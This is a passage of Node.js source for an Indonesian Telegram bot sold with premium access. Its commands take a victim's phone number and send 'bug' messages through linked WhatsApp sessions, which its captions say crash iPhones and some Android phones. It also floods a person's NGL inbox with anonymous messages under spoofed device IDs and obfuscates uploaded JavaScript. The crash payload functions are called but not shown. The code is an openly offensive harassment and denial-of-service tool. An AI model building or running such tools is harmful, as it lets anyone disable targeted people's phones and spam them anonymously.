    await bugwhatsapp(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ZyuRForce (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ZyuRNovaXz (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await pungtion(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/ZyuRIphong (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug ini work di semua device dan berlangsung lama
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug ini work di semua device dan berlangsung lama
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Xvcrash(sessions.values().next().value, jid);
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// Enc Fiture

bot.onText(/\/encvexxuzzz/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id.toString();

    // Cek Premium User
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
            parse_mode: "MarkdownV2",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
                    [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
                ]
            }
        });
    }

    // Cek apakah balas pesan dengan file
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/encvexxuzzz`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `vexxuzzz-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        // Cek apakah file valid sebelum dienkripsi
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        // Proses enkripsi menggunakan Vincent Chaos Core
        const obfuscated = await JsConfuser.obfuscate(fileContent, getVexxuzzZObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        // Cek apakah hasil enkripsi valid
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        // Kirim file hasil enkripsi
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "✅ *File terenkripsi (Vexxuzzz Chaos Core) siap!*\n_©INAZAMI INVICTUS",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "VexxuzzZ Chaos Core Selesai");

        // Hapus file setelah dikirim
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

        // Hapus file jika ada error
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});

bot.onText(/\/ngl (.+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const nglLink = match[1].trim();
    const totalPesan = parseInt(match[2]);

    if (totalPesan > 100) {
        return bot.sendMessage(chatId, '<blockquote>❌ Maksimal pesan untuk NGL adalah 100 pesan!</blockquote>', {
            parse_mode: 'HTML'
        });
    }

    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '<blockquote>❌ Silakan reply pesan yang ingin dikirim ke NGL!</blockquote>', {
            parse_mode: 'HTML'
        });
    }

    const messageText = msg.reply_to_message.text || msg.reply_to_message.caption || '';
    
    if (!messageText) {
        return bot.sendMessage(chatId, '<blockquote>❌ Pesan yang di-reply tidak mengandung teks!</blockquote>', {
            parse_mode: 'HTML'
        });
    }

    let nglUsername;
    try {
        const url = new URL(nglLink);
        nglUsername = url.pathname.split('/').filter(part => part.length > 0)[0];
    } catch (error) {
        nglUsername = nglLink.replace(/^@/, '');
    }

    if (!nglUsername) {
        return bot.sendMessage(chatId, '<blockquote>❌ Format link NGL tidak valid!\nContoh: /ngl https://ngl.link/username 10</blockquote>', {
            parse_mode: 'HTML'
        });
    }

    try {
        bot.sendMessage(chatId, `<blockquote>🚀 Memulai mengirim ${totalPesan} pesan anonim ke ${nglUsername}...</blockquote>`, {
            parse_mode: 'HTML'
        });

        let successCount = 0;
        let failedCount = 0;

        for (let i = 1; i <= totalPesan; i++) {
            try {
                const response = await axios.post(`https://ngl.link/api/submit`, {
                    username: nglUsername,
                    question: messageText,
                    deviceId: XemzzgenerateDeviceId(),
                    gameSlug: '',
                    referrer: ''
                }, {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'Origin': 'https://ngl.link',
                        'Referer': `https://ngl.link/${nglUsername}`,
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin'
                    },
                    timeout: 10000
                });

                if (response.status === 200) {
                    successCount++;
                    bot.sendMessage(chatId, `<blockquote>✅ Pesan ${i}/${totalPesan} berhasil dikirim!</blockquote>`, {
                        parse_mode: 'HTML'
                    });
                } else {
                    failedCount++;
                    bot.sendMessage(chatId, `<blockquote>❌ Pesan ${i}/${totalPesan} gagal dikirim!</blockquote>`, {
                        parse_mode: 'HTML'
                    });
                }

                const delay = Math.floor(Math.random() * 3000) + 2000;
                await new Promise(resolve => setTimeout(resolve, delay));

            } catch (error) {
                failedCount++;
                console.error(`Error mengirim pesan ${i}:`, error.message);
                
                if (error.response && error.response.status === 404) {
                    bot.sendMessage(chatId, `<blockquote>❌ Username "${nglUsername}" tidak ditemukan di NGL!</blockquote>`, {
                        parse_mode: 'HTML'
                    });
                    break;
                } else if (error.response && error.response.status === 429) {
                    bot.sendMessage(chatId, `<blockquote>⏳ Terlalu banyak request, tunggu beberapa saat...</blockquote>`, {
                        parse_mode: 'HTML'
                    });
                    await new Promise(resolve => setTimeout(resolve, 10000));
                }
            }
        }

        const resultText = 
`<blockquote>📊 HASIL PENGIRIMAN NGL

👤 Target: ${nglUsername}
📨 Total pesan: ${totalPesan}
✅ Berhasil: ${successCount}
❌ Gagal: ${failedCount}
📊 Success Rate: ${((successCount / totalPesan) * 100).toFixed(1)}%</blockquote>`;

        bot.sendMessage(chatId, resultText, { parse_mode: 'HTML' });

    } catch (error) {
        console.error('Error NGL:', error);
        bot.sendMessage(chatId, `<blockquote>❌ Error: ${error.message}</blockquote>`, {
            parse_mode: 'HTML'
        });
    }
});

//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem You Id 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem You Id 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem You Id 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "⛧ ＬＩＳＴ ＰＲＥＭＩＵＭ ⛧\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin You Id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin You Id.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem You Id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin You Id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin You Id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

/// PLAY
bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1] ? match[1].trim() : '';
  const randomImage = getRandomImage();
  
    if (!query) {
    return bot.sendMessage(chatId,
      `<b>🎵 Pencarian Musik</b>\n\nSilakan ketik judul lagu atau artis yang ingin dicari\n\n<b>📌 Contoh:</b>\n<code>/play Kami - One Direction</code>\n<code>/play Coldplay Adventure of Lifetime</code>`,
      { parse_mode: "HTML" }
    );
  }

  try {
    const searchMsg = await bot.sendMessage(chatId,
      `<b>🔍 Mencari Musik...</b>\n\n<b>Query:</b> <code>${query}</code>`,
      { parse_mode: "HTML" }
    );

    const response = await fetch(`https://apizsa.vercel.app/tools/play?q=${encodeURIComponent(query)}`);
    const data = await response.json();

    if (!data.status || !data.download || !data.download.audio) {
      return bot.editMessageText(
        `<b>❌ Musik Tidak Ditemukan</b>\n\nTidak dapat menemukan musik untuk:\n<code>${query}</code>\n\nSilakan coba dengan kata kunci yang berbeda.`,
        {
          chat_id: chatId,
          message_id: searchMsg.message_id,
          parse_mode: "HTML"
        }
      );
    }

    await bot.deleteMessage(chatId, searchMsg.message_id);
    await bot.sendAudio(
      chatId,
      data.download.audio.url,
      {
        caption: `<b>🎵 Musik Ditemukan</b>\n\n<b>Query:</b> <code>${query}</code>\n<b>Format:</b> Audio MP3\n<b>Source:</b> YouTube`,
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId,
      `<b>❌ Error Saat Pencarian</b>\n\nTerjadi kesalahan saat mencari musik.\nSilakan coba lagi beberapa saat.`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/\/gethtml$/, (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const key = `${chatId}:${fromId}`;

  // reset timer kalau sudah ada pending
  if (pendingHtml.has(key)) {
    clearTimeout(pendingHtml.get(key).timeout);
  }

  bot.sendMessage(chatId, "[ 🔎 ] kirim url website yang ingin diambil ( contoh: https://example.com )\nhanya url dari kamu yang akan diproses timeout 2 menit.")
    .then(() => {
